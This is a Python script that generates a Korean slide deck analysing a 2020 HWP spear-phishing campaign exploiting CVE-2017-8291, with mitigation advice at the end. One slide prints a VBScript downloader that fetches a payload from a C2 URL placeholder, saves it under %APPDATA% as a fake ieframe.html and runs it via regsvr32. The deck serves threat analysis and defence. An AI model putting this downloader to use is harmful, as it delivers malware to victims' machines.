from pptx import Presentation
from pptx.util import Inches, Pt
from pptx.enum.shapes import MSO_SHAPE, MSO_CONNECTOR_TYPE

def add_flowchart_slide(prs):
    slide = prs.slides.add_slide(prs.slide_layouts[1])
    slide.shapes.title.text = "공격 흐름도"
    slide.placeholders[1].text = ""
    left, top = Inches(1), Inches(1.5)
    w, h = Inches(2), Inches(0.8)
    steps = ["HWP 열기", "EPS 삽입 → 쉘코드 실행", "VBScript 실행", "C2 통신", "페이로드 저장", "regsvr32 실행"]
    shapes = []
    for i, txt in enumerate(steps):
        shp = slide.shapes.add_shape(MSO_SHAPE.RECTANGLE, left, top + i * h * 1.2, w, h)
        shp.text = txt
        shapes.append(shp)
        if i > 0:
            prev = shapes[i-1]
            slide.shapes.add_connector(
                MSO_CONNECTOR_TYPE.STRAIGHT,
                prev.left + w, prev.top + h/2,
                shp.left, shp.top + h/2
            )

def build_pptx(filename="HWP_attack_analysis_complete.pptx"):
    prs = Presentation()
    # 타이틀
    slide = prs.slides.add_slide(prs.slide_layouts[0])
    slide.shapes.title.text = "HWP 스피어피싱 공격 분석"
    slide.placeholders[1].text = "[조회]비트코인 투자 카페 강퇴&활동정지 사례"

    # 공격 개요
    slide = prs.slides.add_slide(prs.slide_layouts[1])
    slide.shapes.title.text = "공격 개요"
    tf = slide.placeholders[1].text_frame
    tf.text = "2020‑04‑29 악성 HWP 유포"
    p = tf.add_paragraph(); p.text = "취약점: CVE‑2017‑8291 (EPS PostScript 쉘코드 실행)"; p.level = 1

    # 취약점 매커니즘
    slide = prs.slides.add_slide(prs.slide_layouts[1])
    slide.shapes.title.text = "취약점 매커니즘"
    tf = slide.placeholders[1].text_frame
    tf.text = "EPS(PostScript) 삽입 → Ghostscript type‑confusion"
    p = tf.add_paragraph(); p.text = "GetProcAddress → system 호출 → VBScript 실행"; p.level = 1

    # VBScript 코드
    slide = prs.slides.add_slide(prs.slide_layouts[1])
    slide.shapes.title.text = "VBScript 다운로더 예제"
    tb = slide.shapes.add_textbox(Inches(0.5), Inches(1.5), Inches(9), Inches(4))
    tf = tb.text_frame; tf.word_wrap = False
    code = [
        "Set xhr = CreateObject(\"Microsoft.XMLHTTP\")",
        "Set shell = CreateObject(\"WScript.Shell\")",
        "If Not Is64Bit Then WScript.Quit",
        "xhr.Open \"GET\", C2_URL & \"?uid=\" & uid & \"&udx=\" & HASH, False",
        "xhr.Send",
        "payload = Base64Decode(BinaryToString(xhr.ResponseBody))",
        "path = shell.ExpandEnvironmentStrings(\"%APPDATA%\") & \"\\Microsoft\\Internet Explorer\\ieframe.html\"",
        "WriteToFile path, payload",
        "shell.Run \"regsvr32 /s \" & path, 0, True"
    ]
    for ln in code:
        p = tf.add_paragraph(); run = p.add_run(); run.text = ln; run.font.name = "Consolas"; run.font.size = Pt(14)

    # 공격 흐름도
    add_flowchart_slide(prs)

    # 쉘코드 구조 이미지 삽입
    slide = prs.slides.add_slide(prs.slide_layouts[1])
    slide.shapes.title.text = "쉘코드 구조 예시"
    slide.placeholders[1].text = ""
    slide.shapes.add_picture("shellcode_diagram.png", Inches(1), Inches(1.5), width=Inches(7))

    # 대응 방안
    slide = prs.slides.add_slide(prs.slide_layouts[1])
    slide.shapes.title.text = "결론 및 대응 방안"
    tf = slide.placeholders[1].text_frame
    plans = ["Ghostscript/HWP 최신 패치 적용", "regsvr32 실행 제한 및 C2 URL 차단", "정기적 보안 교육 및 모의 훈련"]
    tf.text = plans[0]
    for txt in plans[1:]:
        p = tf.add_paragraph(); p.text = txt; p.level = 1

    prs.save(filename)
    print(f"[완료] {filename} 생성됨")

if __name__ == "__main__":
    build_pptx()
